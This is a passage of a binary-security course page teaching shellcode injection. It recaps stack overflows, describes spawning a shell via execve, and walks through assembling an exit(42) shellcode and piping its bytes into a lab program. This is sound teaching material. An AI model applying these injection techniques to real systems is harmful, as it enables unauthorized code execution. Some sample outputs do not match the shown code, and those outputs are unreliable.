<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-Exploitation Techniques/Shellcodes/Reading/README">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.1.0">
<title data-rh="true">Shellcodes | Binary Security</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="http://open-education-hub.github.io/binary-security/Exploitation Techniques/Shellcodes/Reading/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Shellcodes | Binary Security"><meta data-rh="true" name="description" content="Introduction"><meta data-rh="true" property="og:description" content="Introduction"><link data-rh="true" rel="canonical" href="http://open-education-hub.github.io/binary-security/Exploitation Techniques/Shellcodes/Reading/"><link data-rh="true" rel="alternate" href="http://open-education-hub.github.io/binary-security/Exploitation Techniques/Shellcodes/Reading/" hreflang="en"><link data-rh="true" rel="alternate" href="http://open-education-hub.github.io/binary-security/Exploitation Techniques/Shellcodes/Reading/" hreflang="x-default"><link rel="stylesheet" href="/binary-security/assets/css/styles.a69a9d41.css">
<link rel="preload" href="/binary-security/assets/js/runtime~main.74200969.js" as="script">
<link rel="preload" href="/binary-security/assets/js/main.d9be8505.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="theme.common.skipToMainContent"><a href="#" class="skipToContent_fXgn">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/binary-security/"><div class="navbar__logo"><img src="/binary-security/img/logo.svg" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/binary-security/img/logo.svg" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">Binary Security</b></a><a class="navbar__item navbar__link" href="/binary-security/Binary Analysis">Binary Analysis</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/binary-security/Exploitation Techniques">Exploitation Techniques</a><a class="navbar__item navbar__link" href="/binary-security/Mitigation and Defensive Strategies">Mitigation and Defensive Strategies</a><a class="navbar__item navbar__link" href="/binary-security/Extra">Extra</a></div><div class="navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebar_njMd"><nav class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/binary-security/">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/binary-security/Binary Analysis/">Binary Analysis</a><button aria-label="Toggle the collapsible sidebar category &#x27;Binary Analysis&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/binary-security/Exploitation Techniques/">Exploitation Techniques</a><button aria-label="Toggle the collapsible sidebar category &#x27;Exploitation Techniques&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/binary-security/Exploitation Techniques/Buffer Exploitation/">Buffer Exploitation</a><button aria-label="Toggle the collapsible sidebar category &#x27;Buffer Exploitation&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" tabindex="0" href="/binary-security/Exploitation Techniques/Shellcodes/">Shellcodes</a><button aria-label="Toggle the collapsible sidebar category &#x27;Shellcodes&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/binary-security/Exploitation Techniques/Shellcodes/Reading/">Reading</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/binary-security/Exploitation Techniques/Shellcodes Advanced/">Shellcodes Advanced</a><button aria-label="Toggle the collapsible sidebar category &#x27;Shellcodes Advanced&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/binary-security/Exploitation Techniques/Return-Oriented Programming/">Return-Oriented Programming</a><button aria-label="Toggle the collapsible sidebar category &#x27;Return-Oriented Programming&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/binary-security/Exploitation Techniques/Return-Oriented Programming Advanced/">Return-Oriented Programming Advanced</a><button aria-label="Toggle the collapsible sidebar category &#x27;Return-Oriented Programming Advanced&#x27;" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/binary-security/Mitigation and Defensive Strategies/">Mitigation and Defensive Strategies</a><button aria-label="Toggle the collapsible sidebar category &#x27;Mitigation and Defensive Strategies&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/binary-security/Extra/">Extra</a><button aria-label="Toggle the collapsible sidebar category &#x27;Extra&#x27;" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/binary-security/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_OVgt"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/binary-security/Exploitation Techniques/"><span itemprop="name">Exploitation Techniques</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/binary-security/Exploitation Techniques/Shellcodes/"><span itemprop="name">Shellcodes</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Reading</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Shellcodes</h1><h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a class="hash-link" href="#introduction" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="stack-buffer-overflow-recap">Stack Buffer Overflow Recap<a class="hash-link" href="#stack-buffer-overflow-recap" title="Direct link to heading">​</a></h3><p>In the last session, we studied what an attacker can do to a program with a stack-buffer-overflow vulnerability: fill up the legitimately reserved space with junk, then overwrite the saved-return value with an address of their choosing.
After the vulnerable function&#x27;s execution ends, its final <code>ret</code> will place the attacker&#x27;s chosen address into the <code>eip</code>/<code>rip</code> and execution will continue from there.</p><p><img loading="lazy" alt="Stack Buffer" src="/binary-security/assets/images/stack_buffer-0b96391d4eed9498228a407c79df21e7.png" width="791" height="416" class="img_ev3q"></p><p>The above scenario limits the attacker to the functionality already present in the vulnerable program.
If an attacker desires to spawn a shell, but no shell-spawning code is already present - tough luck!
In this session we will start studying a method of overcoming this limitation: code injection.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="code-injection">Code Injection<a class="hash-link" href="#code-injection" title="Direct link to heading">​</a></h3><p>If the code we want to execute is not present in the target program, we&#x27;ll simply add it ourselves!
We will implement our desired functionality in machine code, inject (which is just a fancy word for &quot;write&quot;) it into the target process&#x27; memory, then force execution to jump to the beginning of our code.
These steps can be succinctly summarized as: develop, inject, trigger.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="develop">Develop<a class="hash-link" href="#develop" title="Direct link to heading">​</a></h4><p>First, we need to implement our desired functionality.
Our goal is to obtain <em>something</em> that can be placed directly into the memory space of a running process and be executed;
so it cannot be text representing code in C, Python, Java etc.
It must be <em>machine code</em>.
This might seem a very difficult task, but we&#x27;ll simply use the tools we usually employ when writing code that we intend to run;
in particular, we will rely on the assembler: we write ASM code to do what we want, then assemble it to obtain a string of machine code bytes.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="inject">Inject<a class="hash-link" href="#inject" title="Direct link to heading">​</a></h4><p>Once we have our string of machine code bytes, we need it to be present in the memory space of the target process.
This means the program must read some input (with a <code>gets</code>, <code>fgets</code>, <code>fscanf</code>, <code>read</code> etc.).
However, if we can <em>launch</em> the program, we can also place our code in the environment or inside a command-line argument;
even if a program doesn&#x27;t use these, the loader still places them in its address space.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="trigger">Trigger<a class="hash-link" href="#trigger" title="Direct link to heading">​</a></h4><p>After having placed our code inside the memory space of the target process, we need to force execution to jump at its beginning.
We already know how to do this, by means of a stack-buffer-overflow, which we studied in the previous session.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="shellcodes-1">&quot;Shellcodes&quot;<a class="hash-link" href="#shellcodes-1" title="Direct link to heading">​</a></h3><p>Usually, the end-goal of an attacker is to force the program to spawn a shell, thus gaining unlimited access.
This can be achieved by injecting machine code that triggers an <code>execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], NULL)</code> system call, hence the name &quot;shellcode&quot;.
However, this label is also used for any piece of injected code, even if it does not spawn a shell.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="tutorials">Tutorials<a class="hash-link" href="#tutorials" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="01-tutorial-generating-machine-code">01. Tutorial: Generating Machine Code<a class="hash-link" href="#01-tutorial-generating-machine-code" title="Direct link to heading">​</a></h3><p>To address the first step of our code injection technique, we will start with a simple example: we want to force the program to end cleanly with an exit code of 42;
more precisely we want to execute an <code>exit(42)</code> system call.</p><div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">BITS 64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdi, 42</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rax, 60</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syscall</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener noreferrer">Linux Syscall Table</a></p><p>We can then use <code>nasm</code> to obtain a file with machine code:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nasm exit_shellcode.nasm -o exit_shellcode.bin</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>NOTE:</strong> <code>exit_shellcode.bin</code> is not an ELF:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ file exit_shellcode.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exit_shellcode.bin: data</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It is not an executable file at all, but simply contains a raw string of machine code bytes.
You can see that it is very, very small:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ wc --bytes exit_shellcode.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">12 exit_shellcode.bin</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="02-tutorial-inspecting-machine-code">02. Tutorial: Inspecting Machine Code<a class="hash-link" href="#02-tutorial-inspecting-machine-code" title="Direct link to heading">​</a></h3><p>We would also like to be able to do the reverse of this: given a file that contains a raw string of machine code bytes, translate it back into readable assembly.
This is useful to check that our assembly process was correct, as well as for analyzing files that we did not create.</p><p>In <a href="/binary-security/Binary Analysis/Exploration Tools/Reading">the first session</a>, we learned to disassemble using <code>objdump</code>.
By default, <code>objdump</code> expects a proper <code>ELF</code> executable and complains about our raw file:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -d -M intel exit_shellcode.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objdump: exit_shellcode.bin: file format not recognized</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We need to use the following command:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -D -b binary -m i386:x86-64 -M intel exit_shellcode.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test.bin:     file format binary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disassembly of section .data:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000000000000000 &lt;.data&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0:   48 c7 c0 ff ff ff ff    mov    rax,0xffffffffffffffff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   7:   bf 2a 00 00 00          mov    edi,0x2a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   c:   b8 3c 00 00 00          mov    eax,0x3c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  11:   0f 05                   syscall</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li><code>-D</code>: disassemble all, not only text/code zones.
In our case this means disassemble the whole file.</li><li><code>-b binary</code>: treat the file as not having a specific object/executable format (such as <code>ELF</code>, <code>COFF</code>, <code>Mach-O</code> or <code>PE</code>).</li><li><code>-m i386:86-64</code>: the machine code inside the binary file is i386 (x86), 64 bits (usually, <code>objdump</code> gets this information from the ELF header).</li><li><code>-M intel</code>: display ASM using Intel assembly syntax, as opposed to AT&amp;T assembly syntax.</li></ul><p>We can also use a tool like <code>xxd</code> or <code>hexdump</code> to inspect the byte values in the file, without disassembling:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ xxd exit_shellcode.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000000: 48c7 c0ff ffff ffbf 2a00 0000 b83c 0000  H.......*....&lt;..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000010: 000f 05                                  ...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="03-tutorial-feeding-machine-code-to-a-program">03. Tutorial: Feeding Machine Code to a Program<a class="hash-link" href="#03-tutorial-feeding-machine-code-to-a-program" title="Direct link to heading">​</a></h3><p>Now that we know how to obtain a bytestring of machine code from an assembly program, it&#x27;s time to move on to the next step: injection.
The simplest way is to redirect the <code>stdin</code> of the target program to the file containing our raw machine code.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./vuln &lt; exit_shellcode.bin</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>However, we might want to freely edit the payload directly on the command-line (for example, if the program reads some other stuff).
The way to do this is to use another tool, like the shell itself, to transform hexadecimal notation into binary data:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ printf &#x27;\x4b\x80\x04\x08&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">K�</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Again, we can use a tool like <code>xxd</code> for the reverse operation, to verify that the binary data comes out as intended:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div 